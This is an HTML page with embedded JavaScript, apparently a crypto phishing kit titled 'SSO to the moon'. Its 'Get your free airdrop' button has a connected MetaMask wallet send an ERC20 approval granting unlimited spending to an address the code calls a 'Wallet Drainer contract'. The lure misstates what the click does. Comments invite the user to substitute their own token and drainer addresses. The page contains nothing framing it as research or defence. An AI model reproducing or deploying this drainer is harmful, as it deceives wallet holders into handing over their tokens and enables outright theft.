<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSO to the moon</title>
</head>
<body>
    <h1>SSO to the moon</h1>
    <!-- Connect button to request account -->
    <button id="connectButton">Click me to connect your wallet</button>

    <!-- Approve button to approve tokens for spending -->
    <button id="approveButton">Get your free airdrop</button>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.0/web3.min.js"></script>
    <script>
        let account;

        // Connect Button Event Listener
        document.getElementById('connectButton').addEventListener('click', async () => {
            // Check if MetaMask is installed
            if (typeof window.ethereum !== 'undefined') {
                console.log('MetaMask is installed!');
                
                // Request accounts from MetaMask
                try {
                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                    account = accounts[0]; // Save the connected account
                    console.log('Connected account:', account);
                    alert(`Connected account: ${account}`);
                } catch (error) {
                    console.error('User rejected connection or error occurred:', error);
                }
            } else {
                alert('MetaMask is not installed!');
            }
        });

        // The ERC20 token contract address (replace with your token's contract address)
        const tokenAddress = '0x094616F0BdFB0b526bD735Bf66Eca0Ad254ca81F';

        // The Wallet Drainer contract address (replace with your drainer contract address)
        const spenderAddress = '0xc68fA1a15992CDB03114D6ac9d7066A8e712A885';

        // The maximum approval amount (for unlimited allowance)
        const maxApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

        async function approveTokens() {
            // Check if MetaMask is installed
            if (window.ethereum) {
                const web3 = new Web3(window.ethereum);

                if (!account) {
                    alert('Please connect your wallet first.');
                    return;
                }

                // ABI for the ERC20 approve function
                const approveAbi = [
                    {
                        constant: false,
                        inputs: [
                            { name: "_spender", type: "address" },
                            { name: "_value", type: "uint256" }
                        ],
                        name: "approve",
                        outputs: [{ name: "", type: "bool" }],
                        type: "function"
                    }
                ];

                // Create a contract instance
                const tokenContract = new web3.eth.Contract(approveAbi, tokenAddress);

                // Send the approve transaction
                try {
                    await tokenContract.methods
                        .approve(spenderAddress, maxApproval)
                        .send({ from: account });

                    alert('Token approval successful!');
                } catch (error) {
                    alert('Error in token approval: ' + error.message);
                }
            } else {
                alert('MetaMask is not installed!');
            }
        }

        // Set up the Approve Button event listener
        document.getElementById('approveButton').addEventListener('click', approveTokens);
    </script>
</body>
</html>
